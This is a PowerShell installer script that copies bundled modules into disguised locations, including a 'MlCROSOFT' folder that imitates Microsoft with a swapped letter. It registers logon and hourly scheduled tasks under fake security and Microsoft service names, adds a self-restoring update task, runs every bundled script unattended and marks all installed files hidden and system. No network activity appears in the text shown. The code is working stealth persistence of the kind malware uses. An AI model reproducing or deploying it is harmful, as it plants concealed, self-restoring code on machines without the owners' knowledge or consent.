# Paths & Settings
$location = Get-Location
$scripts = "${location}\scripts"
$_sourcePathSystem = "${location}\system"
$_sourcePathLocal = "${location}\local"
$_destinationPath = "C:\Users\$env:USERNAME\documents\Microsoft"
$_resourcesPath = "${location}\extra"
$_updatePath = "C:\Users\$env:USERNAME"
$_backupPath = "C:\ProgramData\MlCROSOFT"
# Script Settings moved to "conf.ps1" located in Module Folder

# Load Module Names/Paths
$modulesLocal = Get-ChildItem -Path $_sourcePathLocal -Directory -Recurse | Select-Object -ExpandProperty Name
$modulesSystem = Get-ChildItem -Path $_sourcePathSystem -Directory -Recurse | Select-Object -ExpandProperty Name
# Check if silent
if ($args -contains '-silent') { $silent = $true } else { $silent = $false }

# Unblock Files
Get-ChildItem -r | unblock-file

# Copy to System
Robocopy "${_sourcePathSystem}" "${_destinationPath}" /A+:SH /MIR /MT

# Export Variables to Modules
function exportVars {
    [string]$FilePath = "vars.txt"
    $variables = Get-Variable
    $exclamationVariables = $variables | Where-Object { $_.Name -like '_*' }
    foreach ($var in $exclamationVariables) {
        $output += "`$" + "$($var.Name)" + " = '" + "$($var.Value)" + "'`n"
    }
    $output | Out-File -FilePath $FilePath
}

# Register Scheduled Tasks
$trigger = New-ScheduledTaskTrigger -AtLogon -User $env:USERNAME
$triggerH = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 1)
$taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
$names = ("SecurityScan", "ScanHelper", "WinDiagnostics", "MicrosoftService", "SSDCleaner", "PerformanceOptimizer", "IntelPowerUtility")
$num = 0
# Local
foreach ($i in $modulesLocal) {
    if (Test-Path "${_sourcePathLocal}\${i}\conf.ps1") {
        $autoRun = $false
        $delay = 0
        $hourly = $false
        $trigger.Delay = "PT0M"
        $exp = Get-Content -Path "${_sourcePathLocal}\${i}\conf.ps1" -Raw; Invoke-Expression $exp;
        if ($autoRun -eq $true) {
            if (Test-Path "${_sourcePathLocal}\${i}\AUTO-RUN-Module.bat") {
                $PS = New-ScheduledTaskAction -Execute "${_sourcePathLocal}\${i}\AUTO-RUN-Module.bat"
            }
            else {
                $PS = New-ScheduledTaskAction -Execute "${_sourcePathLocal}\${i}\RUN-Module.bat"
            }
            $trigger.Delay = "PT${delay}M"
            Register-ScheduledTask -TaskName $names[$num] -TaskPath "\SYS\WIN32\x64\Security\" -Trigger $trigger -User $env:USERNAME -Action $PS -Settings $taskSettings
        }
        if ($hourly -eq $true) {
            $PSH = New-ScheduledTaskAction -Execute "${_sourcePathLocal}\${i}\RUN-Module.bat"
            Register-ScheduledTask -TaskName $names[$num] -TaskPath "\SYS\WIN32\x86\Security\" -Trigger $triggerH -User $env:USERNAME -Action $PSH -Settings $taskSettings
        }
        $num++
    }
}
# System
foreach ($i in $modulesSystem) {
    if (Test-Path "${_sourcePathSystem}\${i}\conf.ps1") {
        $autoRun = $false
        $delay = 0
        $hourly = $false
        $trigger.Delay = "PT0M"
        $exp = Get-Content -Path "${_sourcePathSystem}\${i}\conf.ps1" -Raw; Invoke-Expression $exp;
        if ($autoRun -eq $true) {
            if (Test-Path "${_sourcePathSystem}\${i}\AUTO-RUN-Module.bat") {
                $PS = New-ScheduledTaskAction -Execute "${_destinationPath}\${i}\AUTO-RUN-Module.bat"
            }
            else {
                $PS = New-ScheduledTaskAction -Execute "${_destinationPath}\${i}\RUN-Module.bat"
            }
            $trigger.Delay = "PT${delay}M"
            Register-ScheduledTask -TaskName $names[$num] -TaskPath "\SYS\WIN32\x64\Security\" -Trigger $trigger -User $env:USERNAME -Action $PS -Settings $taskSettings
        }
        if ($hourly -eq $true) {
            $PSH = New-ScheduledTaskAction -Execute "${_sourcePathLocal}\${i}\RUN-Module.bat"
            Register-ScheduledTask -TaskName $names[$num] -TaskPath "\SYS\WIN32\x86\Security\" -Trigger $triggerH -User $env:USERNAME -Action $PSH -Settings $taskSettings
        }
        $num++
    }
}

# Auto Update/Restore
Set-ItemProperty -Path "${_updatePath}\netrun.bat" -Name Attributes -Value 2
Copy-Item "${location}\netrun.bat" $_updatePath -Force
$trigger = New-ScheduledTaskTrigger -AtLogon -User $env:USERNAME
$trigger.Delay = 'PT15M' # Delay for Task
$PS = New-ScheduledTaskAction -Execute "${_updatePath}\netrun.bat" -Argument "-silent"
Register-ScheduledTask -TaskName "AutoUpdate" -TaskPath "\SYS\WIN32\x64\Security\" -Trigger $trigger -User $env:USERNAME -Action $PS -Settings $taskSettings

# Backup Restore
if (-not (Test-Path "${_backupPath}")){ New-Item -Path "${_backupPath}" -ItemType Directory }
Set-Location "${_backupPath}"
Copy-Item "${location}\backup.ps1" "${_backupPath}\backup.ps1" -Force
exportVars
Start-Process powershell.exe -WindowStyle Minimized "${_backupPath}\backup.ps1"
Set-Location $location

# Run Batch Scripts (.bat)
$scriptsBatch = Get-ChildItem -Path "${scripts}\batch" -Recurse | Select-Object -ExpandProperty FullName
foreach ($i in $scriptsBatch) { if ($i.EndsWith('.bat')) { Start-Process $i } }

# Run Powershell Scripts (.ps1)
$scriptsPowershell = Get-ChildItem -Path "${scripts}\powershell" -Recurse | Select-Object -ExpandProperty FullName
foreach ($i in $scriptsPowershell) { if ($i.EndsWith('.ps1')) { $exp = Get-Content -Path $i -Raw; Invoke-Expression $exp; Set-Location $location } }

# Export Variables
foreach ($i in $modulesLocal) { Set-Location "${_sourcePathLocal}\${i}"; exportVars }
foreach ($i in $modulesSystem) { Set-Location "${_destinationPath}\${i}"; exportVars }

# Hide
foreach ($name in $modulesSystem) { Set-ItemProperty -Path "${_destinationPath}\${name}" -Name Attributes -Value 6 }
foreach ($name in $modulesSystem) { Get-ChildItem -r "${_destinationPath}\${name}" -Attributes d,h,r,s,a | ForEach-Object { Set-ItemProperty -Path $_.FullName -Name Attributes -Value 6 } }
Set-ItemProperty -Path "${_updatePath}\netrun.bat" -Name Attributes -Value 6
foreach ($name in Get-ChildItem -Path $_backupPath ) { Set-ItemProperty -Path "${_backupPath}\${name}" -Name Attributes -Value 6 }
Set-ItemProperty -Path "${_backupPath}" -Name Attributes 6

# Check if silent
if ($args -notcontains '-silent') {
    # Run Modules
    foreach ($i in $modulesLocal) { Set-Location "${_sourcePathLocal}\${i}"; Start-Process .\RUN-Module.bat }
    foreach ($i in $modulesSystem) { Set-Location "${_destinationPath}\${i}"; Start-Process .\RUN-Module.bat }
}
